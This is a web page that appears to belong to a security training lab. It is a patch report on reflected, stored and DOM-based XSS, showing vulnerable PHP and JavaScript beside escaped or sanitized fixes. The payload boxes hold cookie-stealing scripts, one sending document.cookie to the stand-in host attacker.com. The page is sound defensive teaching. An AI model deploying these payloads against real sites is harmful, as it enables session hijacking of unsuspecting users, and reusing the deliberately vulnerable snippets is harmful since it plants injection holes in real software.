<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Patch Report: XSS - MIL-OPS</title>
  <?php include_once ROOT . '/shared/military-ui/header.php'; ?>
  <style>
  .patch-container {
    max-width: 900px;
    margin: 2rem auto;
  }

  .vuln-section {
    background: rgba(13, 18, 24, 0.8);
    border: 1px solid #1a3d2f;
    padding: 1.5rem;
    margin-bottom: 1.5rem;
    border-radius: 4px;
  }

  .payload-box {
    background: #0a0f14;
    border-left: 3px solid #ef4444;
    padding: 1rem;
    font-family: 'Courier New', monospace;
    margin: 1rem 0;
    overflow-x: auto;
  }

  .fix-box {
    background: #0a0f14;
    border-left: 3px solid #00ff7f;
    padding: 1rem;
    font-family: 'Courier New', monospace;
    margin: 1rem 0;
  }

  .code-comment {
    color: #6b7280;
  }

  .code-keyword {
    color: #fbbf24;
  }

  .code-string {
    color: #00ff7f;
  }
  </style>
</head>

<body class="mil-ops-bg">
  <?php include_once ROOT . '/shared/sidebar.php'; ?>

  <main class="mil-ops-main">
    <div class="mission-header">
      <h1><span class="icon">🛡️</span> VULNERABILITY PATCH REPORT</h1>
      <p class="objective">Cross-Site Scripting (XSS) - Analysis & Remediation</p>
      <div class="clearance-badge">THREAT LEVEL: CRITICAL</div>
    </div>

    <div class="patch-container">
      <!-- Level 1: Reflected XSS -->
      <div class="vuln-section">
        <h2><span class="icon">⚠️</span> LEVEL 1: REFLECTED XSS</h2>
        <p><strong>Vector:</strong> Search parameter reflected in page output without sanitization</p>

        <h3>Attack Payload:</h3>
        <div class="payload-box">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
        <div class="payload-box">&lt;img src=x onerror="fetch('/steal?c='+document.cookie)"&gt;</div>

        <h3>Vulnerability Analysis:</h3>
        <p>User input from search query is directly rendered using <code>innerHTML</code> or echoed without escaping.
        </p>

        <h3>Secure Fix:</h3>
        <div class="fix-box">
          <span class="code-comment">// ❌ VULNERABLE:</span>
          echo <span class="code-string">"&lt;div&gt;"</span> . $_GET[<span class="code-string">'q'</span>] . <span
            class="code-string">"&lt;/div&gt;"</span>;

          <span class="code-comment">// ✅ SECURE:</span>
          echo <span class="code-string">"&lt;div&gt;"</span> . htmlspecialchars($_GET[<span
            class="code-string">'q'</span>], ENT_QUOTES, <span class="code-string">'UTF-8'</span>) . <span
            class="code-string">"&lt;/div&gt;"</span>;
        </div>

        <h3>Key Defense:</h3>
        <ul>
          <li>Use <code>htmlspecialchars()</code> for all user output</li>
          <li>Set Content-Type header to text/html with UTF-8</li>
          <li>Implement Content Security Policy (CSP)</li>
        </ul>
      </div>

      <!-- Level 2: Stored XSS -->
      <div class="vuln-section">
        <h2><span class="icon">⚠️</span> LEVEL 2: STORED XSS</h2>
        <p><strong>Vector:</strong> Malicious script stored in database and rendered to other users</p>

        <h3>Attack Payload:</h3>
        <div class="payload-box">&lt;script&gt;new
          Image().src='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</div>

        <h3>Vulnerability Analysis:</h3>
        <p>User-submitted content (reports, comments) saved to database and displayed without output encoding.</p>

        <h3>Secure Fix:</h3>
        <div class="fix-box">
          <span class="code-comment">// ❌ VULNERABLE:</span>
          foreach ($reports as $report) {
          echo <span class="code-string">"&lt;td&gt;"</span> . $report[<span class="code-string">'content'</span>] .
          <span class="code-string">"&lt;/td&gt;"</span>;
          }

          <span class="code-comment">// ✅ SECURE:</span>
          foreach ($reports as $report) {
          echo <span class="code-string">"&lt;td&gt;"</span> . htmlspecialchars($report[<span
            class="code-string">'content'</span>], ENT_QUOTES, <span class="code-string">'UTF-8'</span>) . <span
            class="code-string">"&lt;/td&gt;"</span>;
          }
        </div>

        <h3>Key Defense:</h3>
        <ul>
          <li>Escape ALL data on output, not just input</li>
          <li>Use prepared statements for database queries</li>
          <li>Consider HTML purifiers for rich text input</li>
        </ul>
      </div>

      <!-- Level 3: DOM XSS -->
      <div class="vuln-section">
        <h2><span class="icon">⚠️</span> LEVEL 3: DOM XSS</h2>
        <p><strong>Vector:</strong> Client-side JavaScript writes untrusted data to DOM</p>

        <h3>Attack Payload:</h3>
        <div class="payload-box">#user=&lt;img src=x onerror="fetch('/steal?c='+document.cookie)"&gt;</div>

        <h3>Vulnerability Analysis:</h3>
        <p>JavaScript reads from URL hash/parameters and writes to innerHTML without sanitization.</p>

        <h3>Secure Fix:</h3>
        <div class="fix-box">
          <span class="code-comment">// ❌ VULNERABLE:</span>
          const userInput = window.location.hash.substring(1);
          document.getElementById(<span class="code-string">'output'</span>).innerHTML = userInput;

          <span class="code-comment">// ✅ SECURE:</span>
          const userInput = window.location.hash.substring(1);
          document.getElementById(<span class="code-string">'output'</span>).textContent = userInput;

          <span class="code-comment">// OR use safe parsing:</span>
          const sanitized = DOMPurify.sanitize(userInput);
          document.getElementById(<span class="code-string">'output'</span>).innerHTML = sanitized;
        </div>

        <h3>Key Defense:</h3>
        <ul>
          <li>Use <code>textContent</code> instead of <code>innerHTML</code></li>
          <li>Sanitize with DOMPurify library if HTML is required</li>
          <li>Avoid <code>eval()</code>, <code>setTimeout(string)</code>, <code>Function()</code></li>
        </ul>
      </div>

      <div class="intel-brief">
        <h3>GENERAL XSS PREVENTION STRATEGY</h3>
        <ol>
          <li><strong>Output Encoding:</strong> Always escape data before rendering</li>
          <li><strong>Content Security Policy:</strong> Implement strict CSP headers</li>
          <li><strong>HttpOnly Cookies:</strong> Prevent JavaScript access to session cookies</li>
          <li><strong>Input Validation:</strong> Whitelist allowed characters where possible</li>
          <li><strong>Security Headers:</strong> X-XSS-Protection, X-Content-Type-Options</li>
        </ol>
      </div>

      <div style="text-align: center; margin-top: 2rem;">
        <a href="?page=labs" class="btn-primary">← RETURN TO LABS</a>
      </div>
    </div>
  </main>

  <?php include_once ROOT . '/shared/military-ui/footer.php'; ?>
</body>

</html>